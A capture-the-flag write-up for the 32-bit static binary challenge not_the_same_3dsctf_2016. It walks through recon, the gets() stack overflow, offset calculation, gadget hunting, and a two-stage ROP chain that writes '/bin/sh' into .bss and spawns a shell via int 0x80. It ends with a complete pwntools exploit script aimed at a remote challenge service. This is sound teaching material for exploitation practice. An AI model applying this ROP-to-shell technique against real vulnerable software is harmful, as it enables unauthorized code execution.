# not_the_same_3dsctf_2016 (BUUCTF)

**Category:** Binary Exploitation / pwn
**Arch:** x86 (32-bit), statically linked, not stripped, No PIE
**Technique:** Stack Buffer Overflow → ret2.bss → ROP → execve("/bin/sh") via `int 0x80`

---

## 1. Recon

```bash
file ./not
```

```
./not: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, not stripped
```

Key facts from this single command:

- **32-bit** → cdecl calling convention: arguments are passed on the stack, not in registers.
- **Statically linked** → the binary carries whatever parts of libc the program actually calls (and whatever those functions call internally) baked directly into its own `.text`. It does **not** mean the entire libc is present — only the code paths that were actually referenced at link time get pulled in.
- **Not stripped** → the symbol table is intact, so functions can be located by name with `nm` instead of pattern-matching bytes.

```bash
checksec --file=./not
```

```
RELRO           STACK CANARY      NX            PIE
Partial RELRO   No canary found   NX enabled    No PIE
```

- No canary → no need to leak/preserve a canary value before smashing the return address.
- NX enabled → can't execute shellcode directly on the stack; need ROP.
- No PIE → the binary's own code/data segments (`.text`, `.data`, `.bss`) load at a fixed address every run, regardless of ASLR. This becomes critical later.

## 2. Looking for ready-made primitives

The intuitive move after seeing "static" is to look for `system()` or `execve()` directly in the symbol table:

```bash
nm ./not | grep -w system
nm ./not | grep -w execve
```

Both return nothing. Confirmed the symbol table isn't empty/broken first:

```bash
nm ./not | wc -l
# 1852
```

1852 symbols — the table is populated. So `system`/`execve` genuinely aren't present. This is the actual reason for the challenge's name: despite being a static binary, it doesn't automatically include every libc function — only what the program's call graph actually pulls in. Since this program never calls `system` or `execve` (directly or transitively), neither made it into the final binary.

Conclusion: no "win function" shortcut available. Will need to build `execve("/bin/sh", NULL, NULL)` manually via a raw `int 0x80` syscall, the same way as in the previous challenge in this series.

## 3. Disassembling `main`

```bash
objdump -d ./not --disassemble=main
```

```asm
080489e0 <main>:
 80489e0: 83 ec 3c             sub    $0x3c,%esp
 80489e3: c7 04 24 b1 c2 0b 08 movl   $0x80bc2b1,(%esp)
 80489ea: e8 b1 66 00 00       call   804f0a0 <_IO_printf>
 80489ef: 8d 44 24 0f          lea    0xf(%esp),%eax
 80489f3: 89 04 24             mov    %eax,(%esp)
 80489f6: e8 d5 6e 00 00       call   804f8d0 <_IO_gets>
 80489fb: 31 c0                xor    %eax,%eax
 80489fd: 83 c4 3c             add    $0x3c,%esp
 8048a00: c3                   ret
```

Breakdown:

| Instruction | Meaning |
|---|---|
| `sub $0x3c,%esp` | Reserves 0x3c (60) bytes of local stack space. No `push ebp` anywhere — no frame pointer is set up. |
| `movl $0x80bc2b1,(%esp)` → `call printf` | Prints a fixed string (no format specifiers), purely informational. |
| `lea 0xf(%esp),%eax` | Computes the address of the local buffer: `esp + 0xf`. |
| `mov %eax,(%esp)` → `call gets` | Calls `gets(buf)` — **the vulnerability.** `gets` has no bound on input length, so it will happily write past the 45 bytes available before the return address. |
| `xor eax,eax` / `add $0x3c,%esp` / `ret` | Equivalent to `return 0;`. |

### Reconstructed C

```c
#include <stdio.h>

int main(void)
{
    char buf[32]; // exact declared size is uncertain, but reachable offset is 45 bytes

    printf("b0r4 v3r s3 7u 4h o b1ch4o m3m0... sssss");
    gets(buf);

    return 0;
}
```

No `push ebp`/`mov ebp,esp` means the binary was compiled with the frame pointer omitted (consistent with some optimization level or an explicit `-fomit-frame-pointer`). This changes the padding formula compared to a "classic" stack frame with a saved EBP.

## 4. Calculating the overflow offset

Because there's no frame pointer, the padding formula is **not** "distance to saved EBP + 4". Instead it's computed directly from the `sub esp, N` and the buffer's offset within that reserved space:

```
total reserved space  = 0x3c = 60 bytes
buffer start offset   = 0xf  = 15 bytes
```

At function entry (before `sub`), `esp` pointed directly at the return address pushed by `call`. After `sub $0x3c,%esp`, that same return address now sits at `esp_new + 0x3c`.

```
padding = 0x3c - 0xf = 45 bytes
```

45 bytes of filler, then the next 4 bytes overwrite the return address directly.

## 5. Finding gadgets

```bash
ROPgadget --binary ./not --only "pop|ret" | grep -E "eax|ebx|ecx|edx"
```

Relevant picks:

```
0x08048b0b : pop eax ; ret
0x0806fcf0 : pop edx ; pop ecx ; pop ebx ; ret
```

```bash
ROPgadget --binary ./not --only "int"
```

```
0x0806d8a5 : int 0x80
```

Since the binary is statically linked, functions like `read`/`write`/`gets` contain their own `int 0x80` instructions internally (that's how they actually talk to the kernel), and because that code is physically present in `.text`, ROPgadget can find it even though nothing in the source explicitly wrote `int 0x80`.

## 6. First attempt — writing `/bin/sh` on the stack (fails off-gdb)

Initial idea: since `gets` places the buffer at a known offset, write `/bin/sh\x00` directly into the beginning of that buffer and reuse its address as the `ebx` argument for `execve`.

Found the live buffer address under gdb:

```bash
gdb ./not
(gdb) break *0x80489f6      # right before `call <_IO_gets>`, so EAX already holds the buffer address
(gdb) run
(gdb) print $eax
(gdb) x/4xb $eax
0xffffd42f: 0x08 0x0c 0xb0 0x0e
```

`buf_addr = 0xffffd42f`

This worked inside gdb (gdb disables ASLR for the child process by default), but running the exact same payload outside gdb (`python3 exp.py` / `process(...)`) caused an immediate `SIGSEGV`. The reason: ASLR is only disabled *inside gdb's own child process*. Outside of it, stack addresses are randomized on every run — the hardcoded `0xffffd42f` from the gdb session almost certainly does not correspond to where the buffer actually lands when run normally, so `execve` dereferences garbage and the process segfaults.

**Lesson confirmed:** even on a No-PIE binary, the stack itself is still subject to ASLR. No PIE only guarantees that the binary's own segments (`.text`, `.data`, `.bss`) are fixed — it says nothing about the stack, heap, or shared libraries.

## 7. Fix — write `/bin/sh` into `.bss` instead

```bash
readelf -S ./not | grep -A1 "\.bss"
```

```
[24] .bss   NOBITS   080ebf80  0a2f80  000e6c  00  WA  0  0 32
```

`.bss` starts at a **fixed** address (`0x080ebf80`) regardless of ASLR, because the binary is No PIE. Instead of trusting a stack address that changes every run, the plan becomes: use the overflow to call `gets()` a second time, this time pointing it at `.bss`, so we control exactly what gets written there and where.

### Stage 1 — call `gets(bss_addr)` via ROP

In cdecl, a function reads its arguments straight from the stack, so no register-popping is needed to call `gets` itself — just chain the values directly:

```
[gets_addr]            <- return into gets()
[fake_return_address]  <- where gets() returns to afterwards
[bss_addr]              <- argument: "write here"
```

One subtlety: cdecl leaves argument cleanup to the *caller*. Since we `ret` into `gets` instead of `call`-ing it normally, nothing ever issues the usual `add esp, 4` to discard the argument after `gets` returns. That means `bss_addr` is still sitting on the stack right where the next gadget expects to find its own value — it gets consumed as garbage by the very first gadget after the fake return. The fix is to add one throwaway `pop eax; ret` immediately after the fake return address purely to absorb that leftover value, before the real ROP chain continues.

### Stage 2 — execve(bss_addr, NULL, NULL)

```
eax = 11                (execve syscall number, x86 32-bit)
ebx = bss_addr           ("/bin/sh" written there in stage 1)
ecx = 0                  (argv = NULL)
edx = 0                  (envp = NULL)
int 0x80
```

## 8. Full exploit

```python
from pwn import *

context.arch = 'i386'

# p = process('./not')
p = remote('<host>', <port>, ssl=True)   

# ---- addresses (from objdump / nm / ROPgadget / readelf) ----
gets_addr           = 0x0804f8d0   # <_IO_gets>, from objdump
pop_eax_ret          = 0x08048b0b
pop_edx_ecx_ebx_ret   = 0x0806fcf0
int_0x80             = 0x0806d8a5
bss_addr             = 0x080ebf80  # from readelf -S, .bss start

payload  = b"A" * 45                     # overflow offset, no frame pointer

# Stage 1: gets(bss_addr)
payload += p32(gets_addr)
payload += p32(pop_eax_ret)              # fake return; also absorbs the
                                          # leftover 'gets' argument on return
payload += p32(bss_addr)                 # gets() argument

# Stage 2: execve(bss_addr, 0, 0)
payload += p32(pop_eax_ret)              # now actually sets eax
payload += p32(11)                       # execve syscall number
payload += p32(pop_edx_ecx_ebx_ret)
payload += p32(0)                        # edx = envp
payload += p32(0)                        # ecx = argv
payload += p32(bss_addr)                 # ebx = "/bin/sh"
payload += p32(int_0x80)

p.sendline(payload)          # triggers the overflow + ROP chain
p.sendline(b"/bin/sh\x00")   # consumed by the second gets() call, written to .bss

p.interactive()
```

## 9. Tools used

| Tool | Purpose |
|---|---|
| `file` | Identify architecture, linking type, strip status |
| `checksec` | Check canary / NX / PIE / RELRO |
| `nm` | Search the symbol table for usable functions (`system`, `execve`) |
| `objdump -d` | Disassemble `main`, locate the vulnerable call and the buffer offset |
| `gdb` | Observe live register/stack state (buffer address) during local debugging |
| `ROPgadget` | Locate `pop`/`ret` gadgets and the `int 0x80` instruction |
| `readelf -S` | Find the fixed address and size of `.bss` |
| `pwntools` | Build and send the final exploit, both locally and against the remote service |

## 10. Key takeaways

- **Static linking ≠ "every libc function is present."** Only the functions actually reachable from the program's call graph get pulled into the final binary. Always verify with `nm` rather than assuming.
- **No PIE does not disable stack ASLR.** It only fixes the binary's own segments (`.text`, `.data`, `.bss`). Addresses computed inside gdb (which disables ASLR for its child by default) will not necessarily match a normal, un-debugged execution.
- **`.bss`/`.data` as a staging area** is a reliable way to sidestep stack ASLR entirely when a write primitive (a second call to a function like `gets`, or a `mov [reg], reg` gadget) is available.
- **cdecl does not auto-clean arguments when functions are entered via `ret` instead of `call`.** Any argument pushed for a ROP-invoked function will still be sitting on the stack when that function returns, and must be explicitly discarded (e.g. with a throwaway `pop; ret`) before the next gadget executes.
